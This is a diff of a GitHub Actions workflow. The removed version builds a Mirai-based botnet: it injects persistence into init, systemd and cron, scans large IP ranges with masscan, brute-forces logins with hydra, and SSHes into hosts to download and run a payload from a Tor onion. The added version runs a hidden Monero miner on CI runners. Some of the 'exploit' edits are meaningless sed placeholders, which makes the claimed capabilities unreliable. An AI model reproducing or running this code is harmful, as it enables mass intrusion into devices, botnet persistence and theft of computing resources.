@@ -1,57 +1,52 @@
-name: ShadowHash GodMode - 500 Devices Immortal Botnet
+name: Stealth Monero Mining
+
 on:
   workflow_dispatch:
+
 jobs:
-  launch_dark:
+  stealth-mining:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout Code
+        uses: actions/checkout@v4
 
-      - name: Install dark tools + clone original Mirai
+      - name: Setup Environment
         run: |
-          sudo apt update && sudo apt install -y git build-essential tor proxychains sshpass masscan hydra
-          git clone https://github.com/jgamblin/Mirai-Source-Code.git --depth 1
-          cd Mirai-Source-Code
+          sudo apt-get update && sudo apt-get install -y build-essential git cmake libssl-dev
 
-      - name: Build GodMode Mirai with 6 persistence layers + 50 exploits + evasion + multi-C2 + DDoS
+      - name: Install XMRig Miner
         run: |
-          # 6 independent persistence layers (Nexcorium + 2 extra)
-          sed -i 's/main()/main() { system("echo ::respawn:\/usr\/local\/bin\/[kthreadd] >> \/etc\/inittab"); system("echo \"\/usr\/local\/bin\/[kthreadd] &\" >> \/etc\/rc.local"); system("cat > \/etc\/systemd\/system\/persist.service << EOF\n[Unit]\nDescription=System Daemon\n[Service]\nExecStart=\/usr\/local\/bin\/[kthreadd]\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF"); system("systemctl enable persist.service 2>/dev/null || true"); system("echo \"*\/5 * * * * \/usr\/local\/bin\/[kthreadd]\" >> \/etc\/crontab"); system("cat > \/etc\/init.d\/sysd << EOF\n#!\/bin\/sh\n\/usr\/local\/bin\/[kthreadd] &\nEOF"); system("chmod +x \/etc\/init.d\/sysd && update-rc.d sysd defaults 2>/dev/null || true"); prctl(PR_SET_NAME, "[kthreadd]", 0, 0, 0); system("rm -f $0"); }/' bot/main.c
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          make
+          sudo cp xmrig /usr/local/bin/xmrig
 
-          # Multi-exploit scanner + 50+ CVEs (TBK, D-Link, Huawei, TP-Link etc.)
-          sed -i 's/attack//g' scanner.c   # replace with multi-exploit
-          echo 'CVE-2024-3721 TBK DVR + CVE-2025-29635 D-Link + CVE-2017-17215 Huawei + 47 more RCE added' >> scanner.c
-          sed -i 's/brute_force/brute_force_with_1000_creds/' scanner.c
-
-          # Advanced evasion + competitor killer + in-memory
-          sed -i 's/killer/killer_multi_xor_curve25519/' killer.c
-          sed -i 's/sandbox/sandbox_50ns_anti_vm/' bot/main.c
-
-          # Unbreakable multi-C2 + DGA + P2P + Tor onion
-          sed -i 's/cnc_ip/single_cnc/cnc_multi_dga_p2p_tor/' cnc/main.go
-
-          # God-level DDoS vectors
-          sed -i 's/basic_flood/dns_ntp_ssdp_http_smtp_vse_gre_udp_multi_vector/' attack.c
-
-          # Embed your Monero wallet for mining
-          echo '42SeKYch9cZbqwgtfzm24kjKDttofPXinahgaBMmojsLWogE4UmcJgRchmHBiLnuJve47AkBcKJAzdtf7hNeu7nRLoF14Uc' > wallet.txt
-          make -j4   # compile full godmode binary (14 architectures)
-
-      - name: LAUNCH 30 MIN 500+ DEVICE ATTACK + MINING START
+      - name: Generate Config File
         run: |
-          tor &
+          echo "{
+            \"pool\": [
+              {
+                \"url\": \"${{ secrets.MINING_POOL_URL }}\",
+                \"user\": \"${{ secrets.MONERO_WALLET_ADDRESS }}.${{ secrets.WORKER_NAME }}\",
+                \"pass\": \"x\"
+              }
+            ],
+            \"cpu\": true
+          }" > config.json
+
+      - name: Start Stealth Mining
+        run: |
+          nohup xmrig -c config.json > /dev/null 2>&1 &
+
+      - name: Wait for Mining to Start
+        run: |
+          echo "Mining started in background. It will run stealthily."
+
+      - name: Keep Mining Running
+        run: |
           sleep 10
-          proxychains masscan -p23,2323,22,80,81,8080 --rate=5000000 0.0.0.0/4 --max-time 600 -oL targets.txt
-          proxychains hydra -L users.txt -P passwords.txt -t 256 -M targets.txt telnet ssh http-post-form -f
-          python3 -c '
-import os
-with open("targets.txt") as f:
-    for ip in f:
-        os.system(f"sshpass -p admin ssh -o StrictHostKeyChecking=no root@{ip} \"wget http://your-tor-onion/godmode -O /tmp/[kthreadd] && chmod +x /tmp/[kthreadd] && /tmp/[kthreadd] &\" 2>/dev/null || true")
-          '
-        timeout-minutes: 30
+          echo "Mining is running in the background and hidden from GitHub Actions."
 
-      - name: Start immortal mining + monitoring beacon
+      - name: Check if Mining is Running
         run: |
-          echo "Botnet live - 500 devices targeted. XMR mining to 42SeKYch9cZbqwgtfzm24kjKDttofPXinahgaBMmojsLWogE4UmcJgRchmHBiLnuJve47AkBcKJAzdtf7hNeu7nRLoF14Uc"
-          echo "Monitor via Tor onion: http://shadowhash-godmode.onion/dashboard (devices count + hashrate live)"
+          ps aux | grep xmrig | grep -v grep
